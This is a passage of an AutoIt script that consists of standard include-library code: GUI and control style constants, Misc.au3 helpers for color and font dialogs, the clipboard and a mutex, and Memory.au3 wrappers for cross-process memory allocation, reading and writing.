Global Const $GUI_SS_DEFAULT_RADIO		= 0
Global Const $GUI_SS_DEFAULT_SLIDER		= $TBS_AUTOTICKS
Global Const $GUI_SS_DEFAULT_TAB		= 0
Global Const $GUI_SS_DEFAULT_TREEVIEW	= BitOR($TVS_HASBUTTONS, $TVS_HASLINES, $TVS_LINESATROOT, $TVS_DISABLEDRAGDROP, $TVS_SHOWSELALWAYS)
Global Const $GUI_SS_DEFAULT_UPDOWN		= $UDS_ALIGNRIGHT
Global Const $GUI_SS_DEFAULT_GUI		= BitOR($WS_MINIMIZEBOX, $WS_CAPTION, $WS_POPUP, $WS_SYSMENU)
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\GUIDefaultConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\GUIConstantsEx.au3>
; ----------------------------------------------------------------------------
Global Const $GUI_EVENT_CLOSE			= -3
Global Const $GUI_EVENT_MINIMIZE		= -4
Global Const $GUI_EVENT_RESTORE			= -5
Global Const $GUI_EVENT_MAXIMIZE		= -6
Global Const $GUI_EVENT_PRIMARYDOWN		= -7
Global Const $GUI_EVENT_PRIMARYUP		= -8
Global Const $GUI_EVENT_SECONDARYDOWN	= -9
Global Const $GUI_EVENT_SECONDARYUP		= -10
Global Const $GUI_EVENT_MOUSEMOVE		= -11
Global Const $GUI_EVENT_RESIZED			= -12
Global Const $GUI_EVENT_DROPPED			= -13
Global Const $GUI_RUNDEFMSG				= 'GUI_RUNDEFMSG'
Global Const $GUI_AVISTOP		= 0
Global Const $GUI_AVISTART		= 1
Global Const $GUI_AVICLOSE		= 2
Global Const $GUI_CHECKED		= 1
Global Const $GUI_INDETERMINATE	= 2
Global Const $GUI_UNCHECKED		= 4
Global Const $GUI_DROPACCEPTED	= 8
Global Const $GUI_NODROPACCEPTED = 4096
Global Const $GUI_ACCEPTFILES	= $GUI_DROPACCEPTED
Global Const $GUI_SHOW			= 16
Global Const $GUI_HIDE 			= 32
Global Const $GUI_ENABLE		= 64
Global Const $GUI_DISABLE		= 128
Global Const $GUI_FOCUS			= 256
Global Const $GUI_NOFOCUS		= 8192
Global Const $GUI_DEFBUTTON		= 512
Global Const $GUI_EXPAND		= 1024
Global Const $GUI_ONTOP			= 2048
Global Const $GUI_FONTITALIC	= 2
Global Const $GUI_FONTUNDER		= 4
Global Const $GUI_FONTSTRIKE	= 8
Global Const $GUI_DOCKAUTO			= 0x0001
Global Const $GUI_DOCKLEFT			= 0x0002
Global Const $GUI_DOCKRIGHT			= 0x0004
Global Const $GUI_DOCKHCENTER		= 0x0008
Global Const $GUI_DOCKTOP			= 0x0020
Global Const $GUI_DOCKBOTTOM		= 0x0040
Global Const $GUI_DOCKVCENTER		= 0x0080
Global Const $GUI_DOCKWIDTH			= 0x0100
Global Const $GUI_DOCKHEIGHT		= 0x0200
Global Const $GUI_DOCKSIZE			= 0x0300
Global Const $GUI_DOCKMENUBAR		= 0x0220
Global Const $GUI_DOCKSTATEBAR		= 0x0240
Global Const $GUI_DOCKALL			= 0x0322
Global Const $GUI_DOCKBORDERS		= 0x0066
Global Const $GUI_GR_CLOSE		= 1
Global Const $GUI_GR_LINE		= 2
Global Const $GUI_GR_BEZIER		= 4
Global Const $GUI_GR_MOVE		= 6
Global Const $GUI_GR_COLOR		= 8
Global Const $GUI_GR_RECT		= 10
Global Const $GUI_GR_ELLIPSE	= 12
Global Const $GUI_GR_PIE		= 14
Global Const $GUI_GR_DOT		= 16
Global Const $GUI_GR_PIXEL		= 18
Global Const $GUI_GR_HINT		= 20
Global Const $GUI_GR_REFRESH	= 22
Global Const $GUI_GR_PENSIZE	= 24
Global Const $GUI_GR_NOBKCOLOR	= -2
Global Const $GUI_BKCOLOR_DEFAULT = -1
Global Const $GUI_BKCOLOR_TRANSPARENT = -2
Global Const $GUI_BKCOLOR_LV_ALTERNATE = 0xFE000000
Global Const $GUI_WS_EX_PARENTDRAG =      0x00100000
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\GUIConstantsEx.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\WindowsConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\WindowsConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ComboConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ComboConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ListViewConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ListViewConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\StaticConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\StaticConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ButtonConstants.au3>
; ----------------------------------------------------------------------------
Global Const $BS_GROUPBOX		= 0x0007
Global Const $BS_BOTTOM			= 0x0800
Global Const $BS_CENTER			= 0x0300
Global Const $BS_DEFPUSHBUTTON	= 0x0001
Global Const $BS_LEFT			= 0x0100
Global Const $BS_MULTILINE		= 0x2000
Global Const $BS_PUSHBOX		= 0x000A
Global Const $BS_PUSHLIKE		= 0x1000
Global Const $BS_RIGHT			= 0x0200
Global Const $BS_RIGHTBUTTON	= 0x0020
Global Const $BS_TOP			= 0x0400
Global Const $BS_VCENTER		= 0x0C00
Global Const $BS_FLAT			= 0x8000
Global Const $BS_ICON			= 0x0040
Global Const $BS_BITMAP			= 0x0080
Global Const $BS_NOTIFY			= 0x4000
Global Const $BS_3STATE			= 0x0005
Global Const $BS_AUTO3STATE		= 0x0006
Global Const $BS_AUTOCHECKBOX	= 0x0003
Global Const $BS_CHECKBOX		= 0x0002
Global Const $BS_AUTORADIOBUTTON	= 0x0009
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ButtonConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ListBoxConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ListBoxConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\TabConstants.au3>
; ----------------------------------------------------------------------------
Global Const $TCS_SCROLLOPPOSITE	= 0x0001
Global Const $TCS_BOTTOM			= 0x0002
Global Const $TCS_RIGHT				= 0x0002
Global Const $TCS_MULTISELECT		= 0x0004
Global Const $TCS_FLATBUTTONS		= 0x0008
Global Const $TCS_FORCEICONLEFT		= 0x0010
Global Const $TCS_FORCELABELLEFT	= 0x0020
Global Const $TCS_HOTTRACK			= 0x0040
Global Const $TCS_VERTICAL			= 0x0080
Global Const $TCS_TABS				= 0x0000
Global Const $TCS_BUTTONS			= 0x0100
Global Const $TCS_SINGLELINE		= 0x0000
Global Const $TCS_MULTILINE			= 0x0200
Global Const $TCS_RIGHTJUSTIFY		= 0x0000
Global Const $TCS_FIXEDWIDTH		= 0x0400
Global Const $TCS_RAGGEDRIGHT		= 0x0800
Global Const $TCS_FOCUSONBUTTONDOWN = 0x1000
Global Const $TCS_OWNERDRAWFIXED	= 0x2000
Global Const $TCS_TOOLTIPS			= 0x4000
Global Const $TCS_FOCUSNEVER		= 0x8000
Global Const $TCS_EX_FLATSEPARATORS 	= 0x1
Global Const $TC_ERR = -1
Global Const $TCIS_BUTTONPRESSED = 0x1
Global Const $TCS_EX_REGISTERDROP = 0x2
Global Const $TCM_FIRST = 0x1300
Global Const $TCM_DELETEALLITEMS = ($TCM_FIRST + 9)
Global Const $TCM_DELETEITEM = ($TCM_FIRST + 8)
Global Const $TCM_DESELECTALL = ($TCM_FIRST + 50)
Global Const $TCM_GETCURFOCUS = ($TCM_FIRST + 47)
Global Const $TCM_GETCURSEL = ($TCM_FIRST + 11)
Global Const $TCM_GETEXTENDEDSTYLE = ($TCM_FIRST + 53)
Global Const $TCM_GETITEMCOUNT = ($TCM_FIRST + 4)
Global Const $TCM_GETITEMRECT = ($TCM_FIRST + 10)
Global Const $TCM_GETROWCOUNT = ($TCM_FIRST + 44)
Global Const $TCM_SETITEMSIZE = $TCM_FIRST + 41
Global Const $TCCM_FIRST = 0X2000
Global Const $TCCM_GETUNICODEFORMAT = ($TCCM_FIRST + 6)
Global Const $TCM_GETUNICODEFORMAT = $TCCM_GETUNICODEFORMAT
Global Const $TCM_HIGHLIGHTITEM = ($TCM_FIRST + 51)
Global Const $TCM_SETCURFOCUS = ($TCM_FIRST + 48)
Global Const $TCM_SETCURSEL = ($TCM_FIRST + 12)
Global Const $TCM_SETMINTABWIDTH = ($TCM_FIRST + 49)
Global Const $TCM_SETPADDING = ($TCM_FIRST + 43)
Global Const $TCCM_SETUNICODEFORMAT = ($TCCM_FIRST + 5)
Global Const $TCM_SETUNICODEFORMAT = $TCCM_SETUNICODEFORMAT
Global Const $TCN_FIRST = -550
Global Const $TCN_SELCHANGE = ($TCN_FIRST - 1)
Global Const $TCN_SELCHANGING = ($TCN_FIRST - 2)
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\TabConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\EditConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\EditConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\DateTimeConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\DateTimeConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\SliderConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\SliderConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\TreeViewConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\TreeViewConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ProgressConstants.au3>
; ----------------------------------------------------------------------------
Global Const $PBS_SMOOTH	= 1
Global Const $PBS_VERTICAL	= 4
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ProgressConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\AVIConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\AVIConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\UpDownConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\UpDownConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\GUIConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\GuiList.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ListBoxConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ListBoxConstants.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\Misc.au3>
; ----------------------------------------------------------------------------
Global Const $CC_ANYCOLOR = 0x100
Global Const $CC_FULLOPEN = 0x2
Global Const $CC_RGBINIT = 0x1
Global Const $CF_EFFECTS = 0x100
Global Const $CF_PRINTERFONTS = 0x2
Global Const $CF_SCREENFONTS = 0x1
Global Const $CF_NOSCRIPTSEL = 0x800000
Global Const $CF_INITTOLOGFONTSTRUCT = 0x40
Global Const $DEFAULT_PITCH = 0
Global Const $FF_DONTCARE = 0
Global Const $LOGPIXELSX = 88
Func _ChooseColor($i_ReturnType = 0, $i_colorref = 0, $i_refType = 0)
	Local $custcolors = "int[16]"
	Local $struct = "dword;int;int;int;ptr;dword;int;ptr;ptr"
	Local $p = DllStructCreate($struct)
	If @error Then
		SetError(-1)
		Return -1
	EndIf
	Local $cc = DllStructCreate($custcolors)
	If @error Then
		SetError(-2)
		Return -1
	EndIf
	If ($i_refType == 1) Then
		$i_colorref = Int($i_colorref)
	ElseIf ($i_refType == 2) Then
		$i_colorref = Hex(String($i_colorref), 6)
		$i_colorref = '0x' & StringMid($i_colorref, 5, 2) & StringMid($i_colorref, 3, 2) & StringMid($i_colorref, 1, 2)
	EndIf
	DllStructSetData($p, 1, DllStructGetSize($p))
	DllStructSetData($p, 2, 0)
	DllStructSetData($p, 4, $i_colorref)
	DllStructSetData($p, 5, DllStructGetPtr($cc))
	DllStructSetData($p, 6, BitOR($CC_ANYCOLOR, $CC_FULLOPEN, $CC_RGBINIT))
	Local $ret = DllCall("comdlg32.dll", "long", "ChooseColor", "ptr", DllStructGetPtr($p))
	If ($ret[0] == 0) Then
		SetError(-3)
		Return -1
	EndIf
	Local $color_picked = DllStructGetData($p, 4)
	If ($i_ReturnType == 1) Then
		Return '0x' & Hex(String($color_picked), 6)
	ElseIf ($i_ReturnType == 2) Then
		$color_picked = Hex(String($color_picked), 6)
		Return '0x' & StringMid($color_picked, 5, 2) & StringMid($color_picked, 3, 2) & StringMid($color_picked, 1, 2)
	ElseIf ($i_ReturnType == 0) Then
		Return $color_picked
	Else
		SetError(-4)
		Return -1
	EndIf
EndFunc
Func _ChooseFont($s_FontName = "Courier New", $i_size = 10, $i_colorref = 0, $i_FontWeight = 0, $i_Italic = 0, $i_Underline = 0, $i_Strikethru = 0)
	Local $ret = DllCall("gdi32.dll", "long", "GetDeviceCaps", "long", 0, "long", $LOGPIXELSX)
	If ($ret[0] == -1) Then
		SetError(-3)
		Return -1
	EndIf
	Local $lfHeight = Round(($i_size * $ret[2]) / 72, 0)
	Local $logfont = "int;int;int;int;int;byte;byte;byte;byte;byte;byte;byte;byte;char[32]"
	Local $struct = "dword;int;int;ptr;int;dword;int;int;ptr;ptr;int;ptr;dword;int;int"
	Local $p = DllStructCreate($struct)
	If @error Then
		SetError(-1)
		Return -1
	EndIf
	Local $lf = DllStructCreate($logfont)
	If @error Then
		SetError(-2)
		Return -1
	EndIf
	DllStructSetData($p, 1, DllStructGetSize($p))
	DllStructSetData($p, 2, 0)
	DllStructSetData($p, 4, DllStructGetPtr($lf))
	DllStructSetData($p, 5, $i_size)
	DllStructSetData($p, 6, BitOR($CF_SCREENFONTS, $CF_PRINTERFONTS, $CF_EFFECTS, $CF_INITTOLOGFONTSTRUCT, $CF_NOSCRIPTSEL))
	DllStructSetData($p, 7, $i_colorref)
	DllStructSetData($p, 13, 0)
	DllStructSetData($lf, 1, $lfHeight + 1)
	DllStructSetData($lf, 5, $i_FontWeight)
	DllStructSetData($lf, 6, $i_Italic)
	DllStructSetData($lf, 7, $i_Underline)
	DllStructSetData($lf, 8, $i_Strikethru)
	DllStructSetData($lf, 14, $s_FontName)
	$ret = DllCall("comdlg32.dll", "long", "ChooseFont", "ptr", DllStructGetPtr($p))
	If ($ret[0] == 0) Then
		SetError(-3)
		Return -1
	EndIf
	Local $fontname = DllStructGetData($lf, 14)
	If (StringLen($fontname) == 0 And StringLen($s_FontName) > 0) Then
		$fontname = $s_FontName
	EndIf
	Local $italic = 0
	Local $underline = 0
	Local $strikeout = 0
	If (DllStructGetData($lf, 6)) Then
		$italic = 2
	EndIf
	If (DllStructGetData($lf, 7)) Then
		$underline = 4
	EndIf
	If (DllStructGetData($lf, 8)) Then
		$strikeout = 8
	EndIf
	Local $attributes = BitOR($italic, $underline, $strikeout)
	Local $size = DllStructGetData($p, 5) / 10
	Local $weight = DllStructGetData($lf, 5)
	Local $colorref = DllStructGetData($p, 7)
	Local $color_picked = Hex(String($colorref), 6)
	Return StringSplit($attributes & "," & $fontname & "," & $size & "," & $weight & "," & $colorref & "," & '0x' & $color_picked & "," & '0x' & StringMid($color_picked, 5, 2) & StringMid($color_picked, 3, 2) & StringMid($color_picked, 1, 2), ",")
EndFunc
Func _ClipPutFile($sFile, $sSeperator = "|")
	Local $vDllCallTmp, $nGlobMemSize, $hGlobal, $DROPFILES, $i, $hLock
	Local $GMEM_MOVEABLE = 0x0002, $CF_HDROP = 15
	$sFile = $sFile & $sSeperator & $sSeperator
	$nGlobMemSize = StringLen($sFile) + 20
	$vDllCallTmp = DllCall("user32.dll", "int", "OpenClipboard", "hwnd", 0)
	If @error Or $vDllCallTmp[0] = 0 Then
		SetError(1)
		Return False
	EndIf
	$vDllCallTmp = DllCall("user32.dll", "int", "EmptyClipboard")
	If @error Or $vDllCallTmp[0] = 0 Then
		SetError(2)
		Return False
	EndIf
	$vDllCallTmp = DllCall("kernel32.dll", "long", "GlobalAlloc", "int", $GMEM_MOVEABLE, "int", $nGlobMemSize)
	If @error Or $vDllCallTmp[0] < 1 Then
		SetError(3)
		Return False
	EndIf
	$hGlobal = $vDllCallTmp[0]
	$vDllCallTmp = DllCall("kernel32.dll", "long", "GlobalLock", "long", $hGlobal)
	If @error Or $vDllCallTmp[0] < 1 Then
		SetError(4)
		Return False
	EndIf
	$hLock = $vDllCallTmp[0]
	$DROPFILES = DllStructCreate("dword;ptr;int;int;int;char[" & StringLen($sFile) & "]", $hLock)
	If @error Then
		SetError(5)
		Return False
	EndIf
	DllStructSetData($DROPFILES, 1, DllStructGetSize($DROPFILES) - StringLen($sFile))
	DllStructSetData($DROPFILES, 2, 0)
	DllStructSetData($DROPFILES, 3, 0)
	DllStructSetData($DROPFILES, 4, 0)
	DllStructSetData($DROPFILES, 5, 0)
	DllStructSetData($DROPFILES, 6, $sFile)
	For $i = 1 To StringLen($sFile)
		If DllStructGetData($DROPFILES, 6, $i) = Asc($sSeperator) Then DllStructSetData($DROPFILES, 6, 0, $i)
	Next
	$vDllCallTmp = DllCall("user32.dll", "long", "SetClipboardData", "int", $CF_HDROP, "long", $hGlobal)
	If @error Or $vDllCallTmp[0] < 1 Then
		SetError(6)
		$DROPFILES = 0
		Return False
	EndIf
	$vDllCallTmp = DllCall("user32.dll", "int", "CloseClipboard")
	If @error Or $vDllCallTmp[0] = 0 Then
		SetError(7)
		$DROPFILES = 0
		Return False
	EndIf
	$vDllCallTmp = DllCall("kernel32.dll", "int", "GlobalUnlock", "long", $hGlobal)
	If @error Then
		SetError(8)
		$DROPFILES = 0
		Return False
	EndIf
	$vDllCallTmp = DllCall("kernel32.dll", "int", "GetLastError")
	If $vDllCallTmp = 0 Then
		$DROPFILES = 0
		SetError(8)
		Return False
	Else
		$DROPFILES = 0
		Return True
	EndIf
EndFunc
Func _Iif($f_Test, $v_TrueVal, $v_FalseVal)
	If $f_Test Then
		Return $v_TrueVal
	Else
		Return $v_FalseVal
	EndIf
EndFunc
Func _MouseTrap($i_left = 0, $i_top = 0, $i_right = 0, $i_bottom = 0)
	Local $av_ret
	If @NumParams == 0 Then
		$av_ret = DllCall("user32.dll", "int", "ClipCursor", "int", 0)
	Else
		If @NumParams == 2 Then
			$i_right = $i_left + 1
			$i_bottom = $i_top + 1
		EndIf
		Local $Rect = DllStructCreate("int;int;int;int")
		If @error Then Return 0
		DllStructSetData($Rect, 1, $i_left)
		DllStructSetData($Rect, 2, $i_top)
		DllStructSetData($Rect, 3, $i_right)
		DllStructSetData($Rect, 4, $i_bottom)
		$av_ret = DllCall("user32.dll", "int", "ClipCursor", "ptr", DllStructGetPtr($Rect))
	EndIf
	Return $av_ret[0]
EndFunc
Func _Singleton($occurenceName, $flag = 0)
	Local $ERROR_ALREADY_EXISTS = 183
	$occurenceName = StringReplace($occurenceName, "\", "")
	Local $handle = DllCall("kernel32.dll", "int", "CreateMutex", "int", 0, "long", 1, "str", $occurenceName)
	Local $lastError = DllCall("kernel32.dll", "int", "GetLastError")
	If $lastError[0] = $ERROR_ALREADY_EXISTS Then
		If $flag = 0 Then
			Exit -1
		Else
			SetError($lastError[0])
			Return 0
		EndIf
	EndIf
	Return $handle[0]
EndFunc
Func _IsPressed($s_hexKey, $v_dll = 'user32.dll')
	Local $a_R = DllCall($v_dll, "int", "GetAsyncKeyState", "int", '0x' & $s_hexKey)
	If Not @error And BitAND($a_R[0], 0x8000) = 0x8000 Then Return 1
	Return 0
EndFunc
Func _SendMessage($h_hWnd, $i_msg, $wParam = 0, $lParam = 0, $i_r = 0, $s_t1 = "int", $s_t2 = "int")
	Local $a_ret = DllCall("user32.dll", "long", "SendMessage", "hwnd", $h_hWnd, "int", $i_msg, $s_t1, $wParam, $s_t2, $lParam)
	If @error Then Return SetError(@error, @extended, "")
	If $i_r >= 0 And $i_r <= 4 Then Return $a_ret[$i_r]
	Return $a_ret
EndFunc
Func _IsClassName($h_hWnd, $s_ClassName)
	If Not IsHWnd($h_hWnd) Then $h_hWnd = GUICtrlGetHandle($h_hWnd)
	Local $aResult = DllCall("user32.dll", "int", "GetClassNameA", "hwnd", $h_hWnd, "str", "", "int", 256)
	If @error Then Return SetError(@error, @error, "")
	If IsArray($aResult) Then
		If StringUpper(StringMid($aResult[2], 1, StringLen($s_ClassName))) = StringUpper($s_ClassName) Then
			Return 1
		Else
			Return 0
		EndIf
	Else
		Return SetError(-1, -1, 0)
	EndIf
EndFunc
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\Misc.au3>
; ----------------------------------------------------------------------------
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\Memory.au3>
; ----------------------------------------------------------------------------
Global Const $MEM_MAP = "uint;uint;ptr"
Global Const $MEM_MAP_HPROC = 1
Global Const $MEM_MAP_ISIZE = 2
Global Const $MEM_MAP_PMEM = 3
Func _MemFree(ByRef $rMemMap)
	Local $hProcess
	Local $pMemory
	Local $bResult
	Local $MEM_RELEASE = 0x00008000
	$hProcess = DllStructGetData($rMemMap, $MEM_MAP_HPROC)
	$pMemory = DllStructGetData($rMemMap, $MEM_MAP_PMEM)
	Switch @OSVersion
		Case "WIN_ME", "WIN_98", "WIN_95"
			$bResult = _VirtualFree($pMemory, 0, $MEM_RELEASE)
		Case Else
			$bResult = _VirtualFreeEx($hProcess, $pMemory, 0, $MEM_RELEASE)
	EndSwitch
	_CloseHandle($hProcess)
	$rMemMap = 0
	Return $bResult
EndFunc
Func _CloseHandle($hObject)
	Local $aResult = DllCall("Kernel32.dll", "int", "CloseHandle", "int", $hObject)
	If @error Or Not IsArray($aResult) Then Return SetError(-1, -1, 0)
	Return $aResult[0]
EndFunc
Func _VirtualAlloc($pAddress, $iSize, $iAllocation, $iProtect)
	Local $aResult = DllCall("Kernel32.dll", "ptr", "VirtualAlloc", "ptr", $pAddress, "int", $iSize, "int", $iAllocation, "int", $iProtect)
	If @error Or Not IsArray($aResult) Then Return SetError(-1, -1, 0)
	Return $aResult[0]
EndFunc
Func _VirtualAllocEx($hProcess, $pAddress, $iSize, $iAllocation, $iProtect)
	Local $aResult = DllCall("Kernel32.dll", "ptr", "VirtualAllocEx", "int", $hProcess, "ptr", $pAddress, "int", $iSize, "int", $iAllocation, "int", $iProtect)
	If @error Or Not IsArray($aResult) Then Return SetError(-1, -1, 0)
	Return $aResult[0]
EndFunc
Func _VirtualFree($pAddress, $iSize, $iFreeType)
	Local $aResult = DllCall("Kernel32.dll", "ptr", "VirtualFree", "ptr", $pAddress, "int", $iSize, "int", $iFreeType)
	If @error Or Not IsArray($aResult) Then Return SetError(-1, -1, 0)
	Return $aResult[0]
EndFunc
Func _VirtualFreeEx($hProcess, $pAddress, $iSize, $iFreeType)
	Local $aResult = DllCall("Kernel32.dll", "ptr", "VirtualFreeEx", "hwnd", $hProcess, "ptr", $pAddress, "int", $iSize, "int", $iFreeType)
	If @error Or Not IsArray($aResult) Then Return SetError(-1, -1, 0)
	Return $aResult[0]
EndFunc
Func _GetWindowThreadProcessId($hWnd, ByRef $iProcessID)
	Local $rProcessID, $aResult
	$rProcessID = DllStructCreate("int")
	$aResult = DllCall("User32.dll", "int", "GetWindowThreadProcessId", "hwnd", $hWnd, "ptr", DllStructGetPtr($rProcessID))
	If @error Or Not IsArray($aResult) Then Return SetError(-1, -1, 0)
	$iProcessID = DllStructGetData($rProcessID, 1)
	Return $aResult[0]
EndFunc
Func _OpenProcess($iAccess, $bInherit, $iProcessID)
	Local $aResult = DllCall("Kernel32.Dll", "int", "OpenProcess", "int", $iAccess, "int", $bInherit, "int", $iProcessID)
	If @error Or Not IsArray($aResult) Then Return SetError(-1, -1, 0)
	Return $aResult[0]
EndFunc
Func _ReadProcessMemory($hProcess, $pBaseAddress, $pBuffer, $iSize, ByRef $iBytesRead)
	Local $rBytesRead = DllStructCreate("int")
	Local $aResult = DllCall("Kernel32.dll", "int", "ReadProcessMemory", "int", $hProcess, "int", $pBaseAddress, _
			"ptr", $pBuffer, "int", $iSize, "ptr", DllStructGetPtr($rBytesRead))
	If @error Or Not IsArray($aResult) Then Return SetError(-1, -1, 0)
	$iBytesRead = DllStructGetData($rBytesRead, 1)
	$rBytesRead = 0
	Return $aResult[0]
EndFunc
Func _WriteProcessMemory($hProcess, $pBaseAddress, $pBuffer, $iSize, ByRef $iBytesWritten)
	Local $rBytesWritten = DllStructCreate("int")
	Local $aResult = DllCall("Kernel32.dll", "int", "WriteProcessMemory", "int", $hProcess, "int", $pBaseAddress, _
			"ptr", $pBuffer, "int", $iSize, "int", DllStructGetPtr($rBytesWritten))
	If @error Or Not IsArray($aResult) Then Return SetError(-1, -1, 0)
	$iBytesWritten = DllStructGetData($rBytesWritten, 1)
	$rBytesWritten = 0
	Return $aResult[0]
EndFunc
Func _MemInit($hWnd, $iSize, ByRef $rMemMap, $pAddress = 0)
	Local $iAccess, $iAllocation
	Local $pMemory, $hProcess
	Local $iProcessID
	Local $PROCESS_VM_OPERATION = 0x00000008
	Local $PROCESS_VM_READ = 0x00000010
	Local $PROCESS_VM_WRITE = 0x00000020
	Local $MEM_RESERVE = 0x00002000
	Local $MEM_COMMIT = 0x00001000
	Local $MEM_SHARED = 0x08000000
	Local $PAGE_READWRITE = 0x00000004
	_GetWindowThreadProcessId($hWnd, $iProcessID)
	$iAccess = BitOR($PROCESS_VM_OPERATION, $PROCESS_VM_READ, $PROCESS_VM_WRITE)
	$hProcess = _OpenProcess($iAccess, False, $iProcessID)
	Switch @OSVersion
		Case "WIN_ME", "WIN_98", "WIN_95"
			$iAllocation = BitOR($MEM_RESERVE, $MEM_COMMIT, $MEM_SHARED)
			$pMemory = _VirtualAlloc($pAddress, $iSize, $iAllocation, $PAGE_READWRITE)
		Case Else
			$iAllocation = BitOR($MEM_RESERVE, $MEM_COMMIT)
			$pMemory = _VirtualAllocEx($hProcess, $pAddress, $iSize, $iAllocation, $PAGE_READWRITE)
	EndSwitch
	If @error Then Return SetError(-1, -1, 0)
	$rMemMap = DllStructCreate($MEM_MAP)
	DllStructSetData($rMemMap, $MEM_MAP_HPROC, $hProcess)
	DllStructSetData($rMemMap, $MEM_MAP_ISIZE, $iSize)
	DllStructSetData($rMemMap, $MEM_MAP_PMEM, $pMemory)
	Return $pMemory
EndFunc
Func _MemRead($rMemMap, $pSrce, $pDest, $iSize)
	Local $hProcess
	Local $iWritten
	$hProcess = DllStructGetData($rMemMap, $MEM_MAP_HPROC)
	Return _ReadProcessMemory($hProcess, $pSrce, $pDest, $iSize, $iWritten)
EndFunc
Func _MemWrite($rMemMap, $pSrce, $pDest = 0, $iSize = 0)
	Local $hProcess
	Local $iWritten
	If $pDest = 0 Then
		$pDest = DllStructGetData($rMemMap, $MEM_MAP_PMEM)
	EndIf
	If $iSize = 0 Then
		$iSize = DllStructGetData($rMemMap, $MEM_MAP_ISIZE)
	EndIf
	$hProcess = DllStructGetData($rMemMap, $MEM_MAP_HPROC)
	Return _WriteProcessMemory($hProcess, $pDest, $pSrce, $iSize, $iWritten)
EndFunc
